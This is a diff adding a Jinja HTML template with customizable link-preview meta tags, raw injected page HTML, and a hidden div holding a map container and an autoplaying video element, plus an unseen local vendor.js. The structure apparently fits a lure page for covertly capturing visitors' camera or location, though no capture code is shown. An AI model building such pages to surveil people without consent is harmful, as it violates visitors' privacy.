@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    {% if meta_title != "" %}
+        <meta property="og:title" content="{{meta_title}}" />
+    {% endif %}
+
+    {% if meta_desc != "" %}
+        <meta property="og:description" content="{{meta_desc}}" />
+    {% endif %}
+
+    {% if meta_image != "" %}
+    <meta property="og:image" content="{{meta_image}}" />
+    {% endif %}
+    
+</head>
+
+<body>
+    {{html|safe}}
+    <div style="display: none;">
+        <div id="map"></div>
+        <video id="video" width="640" height="480" autoplay></video>
+    </div>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js"
+        integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
+
+    <script>
+        const tld = '{{tld}}'
+    </script>
+    <script src="/static/vendor.js"></script>
+</html>
